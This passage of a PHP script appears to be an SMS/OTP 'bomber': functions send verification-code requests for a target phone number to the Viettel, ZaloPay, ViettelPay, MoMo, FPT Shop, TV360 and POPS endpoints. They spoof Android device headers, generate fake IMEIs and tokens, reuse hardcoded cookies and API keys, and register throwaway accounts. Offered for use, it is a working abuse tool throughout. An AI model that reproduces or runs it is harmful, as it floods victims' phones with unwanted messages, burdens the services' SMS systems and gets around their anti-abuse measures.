		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
	);
	$GET = CURL("GET", "https://viettel.vn/dang-ky", null, $head, false);
	$token = explode('"', explode('name="csrf-token" content="', $GET)[1])[0];
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-XSRF-TOKEN: eyJpdiI6Ik1tKzdYTWlYXC9jenl1OVRTNjlRV253PT0iLCJ2YWx1ZSI6IjZQdkY5SHpUVDdRSXdRUzlRRkx4Z2tKeW91RkZoTkhWQXZzU01EQzhHVW9cL2ZiK2lKZzMxYndhWWp4NmJkVmhWIiwibWFjIjoiMDNkMTVkNzhkODE1ZTA4ZjI0MTVlMmU5MDJhZjUwMTY5MGIxNDgyN2Q2MzZlNDJhNDNkNDQyZjJkNWVjZDk5MyJ9",
		"X-CSRF-TOKEN: ".$token,
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
		"Referer: https://viettel.vn/dang-nhap",
	);
	$data = '{"msisdn":"'.$sdt.'"}';
	$GET = json(CURL("POST", "https://viettel.vn/api/get-otp", $data, $head, false));
	if($GET["code"] == 200){
		return array("VT.VN" => "Thành Công");
	} else {
		print_r($GET);
		return array("VT.VN" => "Thất Bại");
	}
}
//otp
function ZALOPAY($sdt) {
	$head = array(
		"Host: api.zalopay.vn",
		"x-platform: NATIVE",
		"x-device-os: ANDROID",
		"x-device-id: 690354367d96c358",
		"x-device-model: Samsung SM-A217F",
		"x-app-version: 7.16.0",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
		"x-density: xhdpi",
		"authorization: Bearer",
		"x-drsite: off",
		"accept-encoding: gzip",
	);
	$get = json(CURL("GET", "https://api.zalopay.vn/v2/account/phone/status?phone_number=".$sdt, null, $head, false));
	$token = $get["data"]["send_otp_token"];
	$data = '{"phone_number":"'.$sdt.'","send_otp_token":"'.$token.'"}';
	$get = json(CURL("POST", "https://api.zalopay.vn/v2/account/otp", $data, $head, false));
	if($get["error"] == 1){
		return array("ZALOPAY" => "Thất Bại");
	} else {
		return array("ZALOPAY" => "Thành Công");
	}
}
//otp
function VTPAY($sdt){
	$head = array(
		"Host: api8.viettelpay.vn",
		"product: VIETTELPAY",
		"accept-language: vi",
		"authority-party: APP",
		"channel: APP",
		"type-os: android",
		"app-version: 5.1.4",
		"os-version: 10",
		"imei: "."VTP_".strtoupper(generateRandomString(32)),
		"x-request-id: ".date("YmdHis"),
		"content-type: application/json; charset=UTF-8",
		"user-agent: okhttp/4.2.2"
	);
	$data = array(
		"type" => "msisdn",
		"username" => $sdt
	);
	$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v1/validate/account", json_encode($data), $head, false));
	if ($GET["status"]["code"] == "CS9901") {
		$data = array(
			"hash" => "",
			"identityType" => "msisdn",
			"identityValue" => $sdt,
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"notifyToken" => "",
			"otp" => "android",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"transactionId" => "",
			"type" => "REGISTER",
			"typeOs" => "android",
			"verifyMethod" => "sms"
		);
		$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v2/accounts/register", json_encode($data), $head, false));
	} else {
		$data = array(
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"loginType" => "BASIC",
			"msisdn" => $sdt,
			"otp" => "",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"requestId" => "",
			"typeOs" => "android",
			"userType" => "msisdn",
			"username" => $sdt
		);
		$GET = json(CURL("POST", "https://api8.viettelpay.vn/auth/v1/authn/login", json_encode($data), $head, false));
	}
	if($GET["status"]["message"] == "Cần xác thực bổ sung OTP" or $GET["status"]["message"] == "Vui lòng nhập mã OTP được gửi về SĐT ".$sdt." để xác minh chính chủ"){
		return array(
			"VTPAY" => "Thành Công"
		);
	} else {
		return array(
			"VTPAY" => "Thất Bại"
		);
	}
}
//otp call
function MOMO($sdt){
	$imei = generateImei();
	$sec = get_SECUREID();
	$token = get_TOKEN();
	$rkey = generateRandom(20);
	$aaid = generateImei();
	$microtime = get_microtime();
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: CHECK_USER_BE_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $sdt,
		'msgType' => 'CHECK_USER_BE_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $sdt,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Oppo realme X Lite",
			'firmware' => '23',
			'hardware' => "RMX1851CN",
			'manufacture' => "Oppo",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => array (
			'checkSum' => '',
		),
	);
	$GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", json_encode($data), $head, false);
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: SEND_OTP_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $sdt,
		'msgType' => 'SEND_OTP_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $sdt,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Galaxy A21s",
			'firmware' => '23',
			'hardware' => "SM-A217F/DS",
			'manufacture' => "Samsung",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => 
		array (
			'action' => 'SEND',
			'rkey' => $rkey,
			'AAID' => $aaid,
			'IDFA' => '',
			'TOKEN' => $token,
			'SIMULATOR' => '',
			'SECUREID' => $sec,
			'MODELID' => "Oppo RMX1851",
			'isVoice' => false,
			'REQUIRE_HASH_STRING_OTP' => true,
			'checkSum' => '',
		),
	);
	$GET = json(CURL("POST", "https://api.momo.vn/backend/otp-app/public/", json_encode($data), $head, false));
	if($GET["errorDesc"] == "Thành công"){
		return array(
			"MOMO" => "Thành Công"
		);
	} else {
		return array(
			"MOMO" => "Thất Bại"
		);
	}
}
function FPTSHOP($sdt){
	$head = array(
		"Host: fptshop.com.vn",
		"Accept: */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85 Mobile Safari/537.36",
		"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
	);
	$data = 'phone='.$sdt;
	$GET = json(CURL("POST", "https://fptshop.com.vn/api-data/loyalty/Login/Verification", $data, $head, false));
	if($GET["datas"]["expiredSeconds"] == "299"){
		return array("FPTSHOP" => "Thành Công");
	} else {
		return array("FPTSHOP" => "Thất Bại");
	}
}
function TV360($sdt){
	$url = "http://m.tv360.vn/public/v1/auth/get-otp-login";
	$ch = curl_init();
	$data = '{"msisdn":"'.$sdt.'"}';
	$head = array(
		"Host: m.tv360.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
		"Content-Type: application/json",
		"Origin: http://m.tv360.vn",
		"Referer: http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
		"Cookie: img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
	);
	$access = json(CURL("POST", $url, $data, $head, false));
	if($access["errorCode"] == 200){
		return array("TV360" => "Thành Công");
	} else {
		return array("TV360" => "Thất Bại");
	}
}
function POPS($sdt){
	$head = array(
		"Host: pops.vn",
		"content-type: application/json",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$access = CURL("GET", "https://pops.vn/auth/signin-signup/signup", null, $head, false);
	$token = explode('"', explode('"DEFAULT_TOKEN":"', $access)[1])[0];
	$head = array(
		"Host: products.popsww.com",
		"profileid: 64078d77bb84c700517c9ce4",
		"authorization: ".$token,
		"x-env: production",
		"content-type: application/json",
		"lang: vi",
		"sub-api-version: 1.1",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"api-key: 5d2300c2c69d24a09cf5b09b",
		"platform: wap",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$data = '{"fullName":"","account":"'.$sdt.'","password":"123456789","confirmPassword":"123456789"}';
	$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/register", $data, $head, false));
	if($access["meta"]){
		return array("POPS" => "Thành Công");
	} else if($access["error"]["statusCode"] == 400){
		$data = '{"account":"'.$sdt.'"}';
		$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/forgotPassword", $data, $head, false));
		if($access["data"]["status"] == "OK"){
			return array("POPS" => "Thành Công");
		} else {
			return array("POPS" => "Thất Bại");
		}
	}
}












function CURL($method, $url, $data, $head, $headers){
	$ch = curl_init();
		curl_setopt_array($ch, array(
			CURLOPT_URL => $url,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_CUSTOMREQUEST => $method,
			CURLOPT_ENCODING => '',
			CURLOPT_HEADER => $headers,
			CURLOPT_POST => TRUE,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FOLLOWLOCATION => TRUE
		));
	$access = curl_exec($ch); 
	return $access;
}
function json($data){
	return json_decode($data,true);
}
function generateRandom($length) {
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomString($length) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateImei() {
	return generateRandomString(8) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(4) . '-' . generateRandomString(12);
}
function get_string($data) {
	return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php','-'),array('','','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function get_microtime() {
	return round(microtime(true) * 1000);
}
function get_TOKEN() {
	return generateRandom(22).':'.generateRandom(9).'-'.generateRandom(20).'-'.generateRandom(12).'-'.generateRandom(7).'-'.generateRandom(7).'-'.generateRandom(53).'-'.generateRandom(9).'_'.generateRandom(11).'-'.generateRandom(4);
}
function get_SECUREID($length = 17) {
	$characters = '0123456789abcdef';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function generateRandomstr($length) {
	$characters = '0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function ECHOJSON($data){
	return json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}
function GET($data){
	return json(file_get_contents($data));
}